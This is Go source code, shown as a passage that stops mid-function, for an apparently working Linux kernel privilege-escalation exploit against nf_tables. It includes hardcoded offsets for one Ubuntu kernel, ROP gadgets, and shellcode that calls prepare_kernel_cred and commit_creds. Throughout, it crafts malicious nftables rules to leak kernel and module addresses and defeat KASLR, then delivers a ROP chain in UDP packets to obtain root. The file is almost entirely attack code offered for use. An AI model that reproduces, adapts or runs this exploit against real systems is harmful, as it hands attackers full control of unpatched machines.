package main

import (
	"C"
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"github.com/google/nftables"
	"golang.org/x/sys/unix"
)
import (
	"math/rand"
	"os"
	"os/exec"
	"path"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	"github.com/google/nftables/expr"
	"github.com/mdlayher/netlink"
	"github.com/vishvananda/netns"
)

/// Offsets for exploits
type exploitConfig struct {
	// Offset from meta_set ops to nf_tables.ko base
	metaSetOpsOff uint64
	// Offset from nf_tables.ko base to byteorder_ops
	byteorderOpsOff uint64
	// Offset from nf_tables.ko base to payload_ops
	payloadOpsOff uint64
	// Offset from nf_tables.ko base to immediate_ops
	immOpsOff uint64
	/// Offset from the regs array on the stack in nft_chain and
	/// the return address to ip_local_deliver
	ipLocalDeliverRegOff uint64
	// ip_local_deliver return from nft_do_chain
	ipLocalDeliverReturn uint64

	// Offset to '__x64_sys_modify_ldt' function in the kernel
	x64_sys_modify_ldt_addr uint64
	// Offset to 'do_task_dead' function in the kernel
	do_task_dead_addr uint64
	// Offset to 'set_memory_rw' function in the kernel
	set_memory_rw_addr uint64
	// Offset to 'prepare_kernel_cred' function in the kernel
	prepare_kernel_cred uint64
	// Offset to 'commit_creds' function in the kernel
	commit_creds uint64
	// Offset to '_copy_from_user' function in the kernel
	copy_from_user_priv uint64
	// Offset to 'pop rdi; ret' gadget in the kernel
	pop_rdi uint64
	// Offset to 'pop rsi; ret' gadget in the kernel
	pop_rsi uint64
	// Offset to 'pop rdx; ret' gadget in the kernel
	pop_rdx uint64
}

var currentConfig *exploitConfig

func CToGoString(b []byte) string {
	i := bytes.IndexByte(b, 0)
	if i < 0 {
		i = len(b)
	}
	return string(b[:i])
}

var cpuCount int = 0
var shellcode []byte = []byte{0x48, 0x31, 0xff, //  xor    rdi,rdi
	0xe8, 0x00, 0x00, 0x00, 0x00, // call   prepare_kernel_cred - 0x8
	0x48, 0x89, 0xc7, // mov    rdi,rax
	0xe8, 0x00, 0x00, 0x00, 0x00, // call   commit_creds - 0x10
	0xc3, // ret
}

func init() {
	configs := make(map[string]exploitConfig)

	// Ubuntu kinetic kudu
	configs["5.19.0-35-generic"] = exploitConfig{
		metaSetOpsOff:           0x2fde0,
		byteorderOpsOff:         0x2f7a0,
		payloadOpsOff:           0x2f9e0,
		immOpsOff:               0x2f1e0,
		x64_sys_modify_ldt_addr: 0x48900,
		do_task_dead_addr:       0x118150,
		set_memory_rw_addr:      0xb3680,
		prepare_kernel_cred:     0x101ea0,
		commit_creds:            0x101bd0,
		copy_from_user_priv:     0x6edfe0,
		ipLocalDeliverRegOff:    0x278,
		ipLocalDeliverReturn:    0xcd9793,
		pop_rdi:                 0x692b8d, // 0xffffffff81692b8d : pop rdi ; test eax, 0x8948000f ; ret
		pop_rsi:                 0xa7c3e,  // 0xffffffff810a7c3e : pop rsi ; ret
		pop_rdx:                 0xa78b25, // 0xffffffff81a78b25 : pop rdx ; add al, 0x39 ; ret
	}

	u := unix.Utsname{}
	unix.Uname(&u)

	if cfg, ok := configs[CToGoString((u.Release[:]))]; ok {
		currentConfig = &cfg
		fmt.Printf("[+] Using config: %v\n", CToGoString(u.Release[:]))
	} else {
		panic(fmt.Errorf("[!] Kernel version '%v' is unsupported", string(u.Release[:])))
	}
}

func packet_leak_path() {
	// Now send a packet
	tx, err := net.DialUDP("udp4", nil, &net.UDPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Port: 1337,
	})

	if err != nil {
		panic(err)
	}

	tx.Write([]byte{1, 2, 3, 4})
	tx.Close()
}

func packet_ropchain_path(ropchain []byte) {
	tx, err := net.DialUDP("udp4", nil, &net.UDPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Port: 1337,
	})

	if err != nil {
		panic(err)
	}

	tx.Write(ropchain)
	tx.Close()
}

func craft_rop_chain(kernelBase uint64) []byte {
	payload := new(bytes.Buffer)

	p64 := func(val uint64) {
		_ = binary.Write(payload, binary.LittleEndian, val)
	}

	// set_memory_rw(sys_modify_ldt, 2)
	p64(kernelBase + currentConfig.pop_rdi)
	p64(kernelBase + (currentConfig.x64_sys_modify_ldt_addr & (0xffff_ffff_ffff_f000)))
	p64(kernelBase + currentConfig.pop_rsi)
	p64(2)
	p64(kernelBase + currentConfig.set_memory_rw_addr)

	// Patch shellcode
	prepare_kernel_cred_shellcode := currentConfig.prepare_kernel_cred - currentConfig.x64_sys_modify_ldt_addr - 0x8
	shellcode[4] = uint8(prepare_kernel_cred_shellcode)
	shellcode[5] = uint8(prepare_kernel_cred_shellcode >> 8)
	shellcode[6] = uint8(prepare_kernel_cred_shellcode >> 16)
	shellcode[7] = uint8(prepare_kernel_cred_shellcode >> 24)

	commit_creds_shellcode := currentConfig.commit_creds - currentConfig.x64_sys_modify_ldt_addr - 0x10
	shellcode[12] = uint8(commit_creds_shellcode)
	shellcode[13] = uint8(commit_creds_shellcode >> 8)
	shellcode[14] = uint8(commit_creds_shellcode >> 16)
	shellcode[15] = uint8(commit_creds_shellcode >> 24)

	// copy shellcode to kernel (_copy_from_user)
	p64(kernelBase + currentConfig.pop_rdi)
	p64(kernelBase + currentConfig.x64_sys_modify_ldt_addr)
	p64(kernelBase + currentConfig.pop_rsi)
	p64(uint64(uintptr(unsafe.Pointer(&shellcode[0]))))
	p64(kernelBase + currentConfig.pop_rdx)
	p64(uint64(len(shellcode)))
	p64(kernelBase + currentConfig.copy_from_user_priv)

	// Make the kernel task hang
	p64(kernelBase + uint64(currentConfig.do_task_dead_addr))

	return payload.Bytes()
}

func leak_module_step(conn *nftables.Conn, moduleBase uint64, kernelBase uint64) error {
	// Main table for important chains
	table := conn.AddTable(&nftables.Table{
		Family: nftables.TableFamilyIPv4,
		Name:   "kaslr",
	})

	// Set recovering the leaked values from the stack
	leakSet := nftables.Set{
		Anonymous: false,
		Constant:  false,
		Name:      "leak-set",
		ID:        1,
		IsMap:     true,
		Table:     table,
		KeyType:   nftables.TypeInteger,
		DataType:  nftables.TypeInteger,
	}

	err := conn.AddSet(&leakSet, nil)

	if err != nil {
		return fmt.Errorf("Could no create set: %v", err)
	}

	// Chain used for leaking information off the stack
	leakChain := conn.AddChain(&nftables.Chain{
		Name:  "leak-chain",
		Table: table,
	})

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			// Copies the lsb of the first jumpstack entry to r14-r19 (NFT_REG32_06 - NFT_REG32_11)
			&expr.Byteorder{
				SourceRegister: 18,
				DestRegister:   8,
				Op:             expr.ByteorderHton,
				Len:            24,
				Size:           2,
			},
			// Add to the set the lsb's
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x00, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 14,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x01, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 15,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x02, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 16,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x03, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 17,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x04, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 18,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x05, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 19,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return err
	}

	// base chain alloc
	policy := nftables.ChainPolicyAccept

	// Put basechain in kmalloc-192
	baseChain := conn.AddChain(&nftables.Chain{
		Name:     "base-chain",
		Table:    table,
		Type:     nftables.ChainTypeFilter,
		Hooknum:  nftables.ChainHookInput,
		Priority: nftables.ChainPriorityFilter,
		Policy:   &policy,
	})

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x01, 0x01, 0x01, 0x01},
			},
			&expr.Meta{
				Key:            unix.NFT_META_NFTRACE,
				SourceRegister: true,
				Register:       8,
			},
		},
	})

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Verdict{
				Kind:  expr.VerdictJump,
				Chain: "leak-chain",
			},
			&expr.Verdict{
				Kind: expr.VerdictReturn,
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not create base chain: %v", err)
	}

	packet_leak_path()

	// Recover entries from set
	elems, err := conn.GetSetElements(&leakSet)

	if err != nil {
		return fmt.Errorf("Could not get set elems: %v", err)
	}

	offsets := []uint16{0, 0, 0, 0, 0, 0}

	for _, elem := range elems {
		key := binary.LittleEndian.Uint32(elem.Key)
		val := binary.BigEndian.Uint16(elem.Val)

		offsets[key] = val
	}

	// offsets[0] = jumpstack[0].chain      u16 lsb high u32
	// offsets[1] = jumpstack[0].chain      u16 lsb low  u32
	// offsets[2] = jumpstack[0].rules      u16 lsb high u32
	// offsets[3] = jumpstack[0].rules      u16 lsb low  u32
	// offsets[4] = jumpstack[0].rules_last u16 lsb high u32
	// offsets[5] = jumpstack[0].rules_last u16 lsb low u32

	// Free all rules from the leak chain and prepare it for a write
	conn.FlushChain(leakChain)

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not delete leakchain rules: %v", err)
	}

	// chain low u16
	chainLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainLow, offsets[0])

	// chain high u16
	chainHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainHigh, offsets[1])

	// rules low u16
	ruleLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLow, offsets[4]-0x22)

	// rules high u16
	ruleHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleHigh, offsets[3])

	// rules_last low u16
	ruleLastLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastLow, (offsets[4]-0x22)+0x8)

	// rules_last high u16
	ruleLastHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastHigh, offsets[5])

	// Payload to write lsb of rules pointer
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			&expr.Immediate{
				Register: 8,
				Data:     chainLow,
			},
			&expr.Immediate{
				Register: 9,
				Data:     chainHigh,
			},
			&expr.Immediate{
				Register: 10,
				Data:     ruleLow,
			},
			&expr.Immediate{
				Register: 11,
				Data:     ruleHigh,
			},
			&expr.Immediate{
				Register: 12,
				Data:     ruleLastLow,
			},
			&expr.Immediate{
				Register: 13,
				Data:     ruleLastHigh,
			},
			&expr.Byteorder{
				SourceRegister: 8,
				DestRegister:   16,
				Op:             expr.ByteorderHton,
				Len:            28,
				Size:           2,
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not add oob write rule: %v", err)
	}

	// Register our trace handler to recover the leak
	traceconn, err := netlink.Dial(unix.NETLINK_NETFILTER, &netlink.Config{})

	if err != nil {
		return fmt.Errorf("Could not setup listening socket: %v", err)
	}

	defer traceconn.Close()

	// Add to trace group
	err = traceconn.JoinGroup(unix.NFNLGRP_NFTRACE)

	if err != nil {
		return fmt.Errorf("Could not add socket to trace group: %v", err)
	}

	// Trigger our leak
	packet_leak_path()

	for {
		messages, err := traceconn.Receive()

		if err != nil {
			return fmt.Errorf("Could not receive trace messages: %v", err)
		}

		// Parse the trace messages
		for _, m := range messages {
			ad, err := netlink.NewAttributeDecoder(m.Data[4:])

			if err != nil {
				return fmt.Errorf("Could not create attribute decoder: %v", err)
			}

			ad.ByteOrder = binary.BigEndian

			for ad.Next() {
				if ad.Type() == unix.NFTA_TRACE_RULE_HANDLE {
					addr := ad.Uint64() >> 3

					// Check that the 3 lower nibbles are identical (untouched by kASLR)
					if (addr & 0xfff) != (currentConfig.immOpsOff & 0xfff) {
						continue
					}

					// Small sanity check that the value > 32 bits
					if addr < 0x100000000 {
						continue
					}

					moduleBase := addr - currentConfig.immOpsOff
					moduleBase |= 0xffffff8000000000 // Set the top 25 bits to ff, which should be fine

					fmt.Printf("LEAK:%x", moduleBase)

					return nil
				}
			}
		}
	}

	return nil
}

func leak_kaslr_step(conn *nftables.Conn, moduleBase uint64, kernelBase uint64) error {
	// Main table for important chains
	table := conn.AddTable(&nftables.Table{
		Family: nftables.TableFamilyIPv4,
		Name:   "kaslr",
	})

	// Set recovering the leaked values from the stack
	leakSet := nftables.Set{
		Anonymous: false,
		Constant:  false,
		Name:      "leak-set",
		ID:        1,
		IsMap:     true,
		Table:     table,
		KeyType:   nftables.TypeInteger,
		DataType:  nftables.TypeInteger,
	}

	err := conn.AddSet(&leakSet, nil)

	if err != nil {
		return fmt.Errorf("Could no create set: %v", err)
	}

	// Set recovering the leaked stack return address
	kleakSet := nftables.Set{
		Anonymous: false,
		Constant:  false,
		Name:      "kaslr-leak-set",
		ID:        1,
		IsMap:     true,
		Table:     table,
		KeyType:   nftables.TypeInteger,
		DataType:  nftables.TypeInteger,
	}

	err = conn.AddSet(&kleakSet, nil)

	if err != nil {
		return fmt.Errorf("Could not create kernel leak set: %v", err)
	}

	// Chain used for leaking information off the stack
	leakChain := conn.AddChain(&nftables.Chain{
		Name:  "leak-chain",
		Table: table,
	})

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			// Copies the lsb of the first jumpstack entry to r14-r19 (NFT_REG32_06 - NFT_REG32_11)
			&expr.Byteorder{
				SourceRegister: 18,
				DestRegister:   8,
				Op:             expr.ByteorderHton,
				Len:            24,
				Size:           2,
			},
			// Add to the set the lsb's
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x00, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 14,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x01, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 15,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x02, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 16,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x03, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 17,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x04, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 18,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x05, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 19,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return err
	}

	// base chain alloc
	policy := nftables.ChainPolicyAccept

	baseChain := conn.AddChain(&nftables.Chain{
		Name:     "base-chain",
		Table:    table,
		Type:     nftables.ChainTypeFilter,
		Hooknum:  nftables.ChainHookInput,
		Priority: nftables.ChainPriorityFilter,
		Policy:   &policy,
	})

	// First rule: jump to leakchain to recover next rule ptr lsb
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Verdict{
				Kind:  expr.VerdictJump,
				Chain: "leak-chain",
			},
		},
	})

	// Second rule: craft a fake rule within a nft_range rule
	w := new(bytes.Buffer)

	// Craft nft_rule_dp with (dlen=32, is_last=0, handle=0)
	_ = binary.Write(w, binary.LittleEndian, uint64(32<<1))

	// Write fake nft_byteorder
	// struct nft_byteorder {
	//   u8                         sreg;                 /*     0     1 */
	//   u8                         dreg;                 /*     1     1 */
	//   enum nft_byteorder_ops     op:8;                 /*     0:16  4 */
	//   u8                         len;                  /*     3     1 */
	//   u8                         size;                 /*     4     1 */
	//
	//   /* size: 8, cachelines: 1, members: 5 */
	//   /* padding: 3 */
	//   /* last cacheline: 8 bytes */
	// };
	_ = binary.Write(w, binary.LittleEndian, uint64(moduleBase+currentConfig.byteorderOpsOff))

	// set byteorder::sreg as the offset // 4 of the return address on the stack
	_ = binary.Write(w, binary.LittleEndian, uint8(currentConfig.ipLocalDeliverRegOff/4))
	// set byteorder::dreg as the register where we want to recover the value (-4 to remove first 4 dwords of regs, aka verdict)
	_ = binary.Write(w, binary.LittleEndian, uint8(12))
	// set byteorder::op to NFT_BYTEORDER_NTOH (not sure if it matters)
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	// set byteorder::len to 8 bytes
	_ = binary.Write(w, binary.LittleEndian, uint8(8))
	// set byteorder::size to 8 (u64)
	_ = binary.Write(w, binary.LittleEndian, uint8(8))

	// padding
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	_ = binary.Write(w, binary.LittleEndian, uint8(0))

	// Write partial nft_meta, which will overlap with the end of the real nft_range
	_ = binary.Write(w, binary.LittleEndian, uint64(moduleBase+currentConfig.metaSetOpsOff))

	payload := w.Bytes()

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Range{
				Op:       expr.CmpOpNeq,
				Register: 8, // Will overlap with meta->key
				FromData: payload[:16],
				ToData:   payload[16:],
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not create base chain: %v", err)
	}

	// Third rule, add our register, which will contain the address to the set
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x00, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 16,
				SetName:    "kaslr-leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x01, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 17,
				SetName:    "kaslr-leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not create base chain: %v", err)
	}

	packet_leak_path()

	// Flush the entries in kaslr leak set
	conn.FlushSet(&kleakSet)

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not flush kaslr leak set: %v", err)
	}

	// Recover entries from set
	elems, err := conn.GetSetElements(&leakSet)

	if err != nil {
		return fmt.Errorf("Could not get set elems: %v", err)
	}

	offsets := []uint16{0, 0, 0, 0, 0, 0}

	for _, elem := range elems {
		key := binary.LittleEndian.Uint32(elem.Key)
		val := binary.BigEndian.Uint16(elem.Val)

		offsets[key] = val
	}

	// offsets[0] = jumpstack[0].chain      u16 lsb high u32
	// offsets[1] = jumpstack[0].chain      u16 lsb low  u32
	// offsets[2] = jumpstack[0].rules      u16 lsb high u32
	// offsets[3] = jumpstack[0].rules      u16 lsb low  u32
	// offsets[4] = jumpstack[0].rules_last u16 lsb high u32
	// offsets[5] = jumpstack[0].rules_last u16 lsb low u32

	// Free all rules from the leak chain and prepare it for a write
	conn.FlushChain(leakChain)

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not delete leakchain rules: %v", err)
	}

	// fmt.Println("[+] Flushed leak chain")

	// for i, e := range offsets {
	// 	fmt.Printf("offset[%v] = 0x%x\n", i, e)
	// }

	// chain low u16
	chainLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainLow, offsets[0])

	// chain high u16
	chainHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainHigh, offsets[1])

	// rules low u16
	// Skip real rule_dp header + nft_range_ops
	ruleLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLow, offsets[2]+16)

	// rules high u16
	ruleHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleHigh, offsets[3])

	// rules_last low u16
	ruleLastLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastLow, offsets[4])

	// rules_last high u16
	ruleLastHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(ruleLastHigh, offsets[5])

	// Payload to write lsb of rules pointer
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			&expr.Immediate{
				Register: 8,
				Data:     chainLow,
			},
			&expr.Immediate{
				Register: 9,
				Data:     chainHigh,
			},
			&expr.Immediate{
				Register: 10,
				Data:     ruleLow,
			},
			&expr.Immediate{
				Register: 11,
				Data:     ruleHigh,
			},
			&expr.Immediate{
				Register: 12,
				Data:     ruleLastLow,
			},
			&expr.Immediate{
				Register: 13,
				Data:     ruleLastHigh,
			},
			&expr.Byteorder{
				SourceRegister: 8,
				DestRegister:   16,
				Op:             expr.ByteorderHton,
				Len:            28,
				Size:           2,
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not add oob write rule: %v", err)
	}

	// Trigger our leak
	packet_leak_path()

	// Recover leaked return address from set
	elems, err = conn.GetSetElements(&kleakSet)

	if err != nil {
		return fmt.Errorf("Could not get set elems: %v", err)
	}

	offsets2 := []uint32{0, 0}

	for _, elem := range elems {
		key := binary.LittleEndian.Uint32(elem.Key)
		val := binary.BigEndian.Uint32(elem.Val)

		offsets2[key] = val
	}

	leakedPtr := uint64(offsets2[0])<<32 | uint64(offsets2[1])

	if (leakedPtr & 0xfff) != (currentConfig.ipLocalDeliverReturn & 0xfff) {
		return fmt.Errorf("Invalid pointer: %x", leakedPtr)
	}

	fmt.Printf("LEAK:%x\n", leakedPtr-currentConfig.ipLocalDeliverReturn)

	return nil
}

func ropchain_step(conn *nftables.Conn, moduleBase uint64, kernelBase uint64) error {
	// Rop chain for our post exploit
	ropchain := craft_rop_chain(kernelBase)

	// Main table for important chains
	table := conn.AddTable(&nftables.Table{
		Family: nftables.TableFamilyIPv4,
		Name:   "rop",
	})

	// Set recovering the leaked values from the stack
	leakSet := nftables.Set{
		Anonymous: false,
		Constant:  false,
		Name:      "leak-set",
		ID:        1,
		IsMap:     true,
		Table:     table,
		KeyType:   nftables.TypeInteger,
		DataType:  nftables.TypeInteger,
	}

	err := conn.AddSet(&leakSet, nil)

	if err != nil {
		return fmt.Errorf("Could no create set: %v", err)
	}

	// Chain used for leaking information off the stack
	leakChain := conn.AddChain(&nftables.Chain{
		Name:  "leak-chain",
		Table: table,
	})

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: leakChain,
		Exprs: []expr.Any{
			// Copies the lsb of the first jumpstack entry to r14-r19 (NFT_REG32_06 - NFT_REG32_11)
			&expr.Byteorder{
				SourceRegister: 18,
				DestRegister:   8,
				Op:             expr.ByteorderHton,
				Len:            24,
				Size:           2,
			},
			// Add to the set the lsb's
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x00, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 14,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x01, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 15,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x02, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 16,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x03, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 17,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x04, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 18,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
			&expr.Immediate{
				Register: 8,
				Data:     []byte{0x05, 0x00, 0x00, 0x00},
			},
			&expr.Dynset{
				SrcRegKey:  8,
				SrcRegData: 19,
				SetName:    "leak-set",
				Operation:  uint32(unix.NFT_DYNSET_OP_ADD),
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return err
	}

	// base chain alloc
	policy := nftables.ChainPolicyAccept

	baseChain := conn.AddChain(&nftables.Chain{
		Name:     "base-chain",
		Table:    table,
		Type:     nftables.ChainTypeFilter,
		Hooknum:  nftables.ChainHookInput,
		Priority: nftables.ChainPriorityFilter,
		Policy:   &policy,
	})

	// First rule: jump to leakchain to recover next rule ptr lsb
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Verdict{
				Kind:  expr.VerdictJump,
				Chain: "leak-chain",
			},
		},
	})

	// Second rule: craft a fake rule within a nft_range rule
	w := new(bytes.Buffer)

	// Craft nft_rule_dp with (dlen=32, is_last=0, handle=0)
	_ = binary.Write(w, binary.LittleEndian, uint64(32<<1))

	// Write fake nft_payload
	// struct nft_payload {
	//   enum nft_payload_bases     base:8;               /*     0: 0  4 */
	//   u8                         offset;               /*     1     1 */
	//   u8                         len;                  /*     2     1 */
	//   u8                         dreg;                 /*     3     1 */

	//   /* size: 4, cachelines: 1, members: 4 */
	//   /* last cacheline: 4 bytes */
	// };
	_ = binary.Write(w, binary.LittleEndian, uint64(moduleBase+currentConfig.payloadOpsOff))

	// set payload::base as NFT_PAYLOAD_TRANSPORT_HEADER
	_ = binary.Write(w, binary.LittleEndian, uint8(2))
	// set payload::offset to 8 (skip UDP header)
	_ = binary.Write(w, binary.LittleEndian, uint8(8))
	// set payload::len to the length of our ropchain (aka, bytes to copy)
	_ = binary.Write(w, binary.LittleEndian, uint8(len(ropchain)))
	// set payload::dreg to point to the return address, beyond the stack canary
	_ = binary.Write(w, binary.LittleEndian, uint8(currentConfig.ipLocalDeliverRegOff/4))

	// padding
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	_ = binary.Write(w, binary.LittleEndian, uint8(0))
	_ = binary.Write(w, binary.LittleEndian, uint8(0))

	// Write partial nft_meta, which will overlap with the end of the real nft_range
	_ = binary.Write(w, binary.LittleEndian, uint64(moduleBase+currentConfig.metaSetOpsOff))

	payload := w.Bytes()

	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Range{
				Op:       expr.CmpOpNeq,
				Register: 8, // Will overlap with meta->key
				FromData: payload[:16],
				ToData:   payload[16:],
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not create base chain: %v", err)
	}

	// Third rule, juste some placeholder
	conn.AddRule(&nftables.Rule{
		Table: table,
		Chain: baseChain,
		Exprs: []expr.Any{
			&expr.Verdict{
				Kind: expr.VerdictReturn,
			},
		},
	})

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not create base chain: %v", err)
	}

	packet_leak_path()

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not flush kaslr leak set: %v", err)
	}

	// Recover entries from set
	elems, err := conn.GetSetElements(&leakSet)

	if err != nil {
		return fmt.Errorf("Could not get set elems: %v", err)
	}

	offsets := []uint16{0, 0, 0, 0, 0, 0}

	for _, elem := range elems {
		key := binary.LittleEndian.Uint32(elem.Key)
		val := binary.BigEndian.Uint16(elem.Val)

		offsets[key] = val
	}

	// offsets[0] = jumpstack[0].chain      u16 lsb high u32
	// offsets[1] = jumpstack[0].chain      u16 lsb low  u32
	// offsets[2] = jumpstack[0].rules      u16 lsb high u32
	// offsets[3] = jumpstack[0].rules      u16 lsb low  u32
	// offsets[4] = jumpstack[0].rules_last u16 lsb high u32
	// offsets[5] = jumpstack[0].rules_last u16 lsb low u32

	// Free all rules from the leak chain and prepare it for a write
	conn.FlushChain(leakChain)

	if err := conn.Flush(); err != nil {
		return fmt.Errorf("Could not delete leakchain rules: %v", err)
	}

	// chain low u16
	chainLow := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainLow, offsets[0])

	// chain high u16
	chainHigh := make([]byte, 4)
	binary.LittleEndian.PutUint16(chainHigh, offsets[1])

	// rules low u16
	// Skip real rule_dp header + nft_range_ops
	ruleLow := make([]byte, 4)
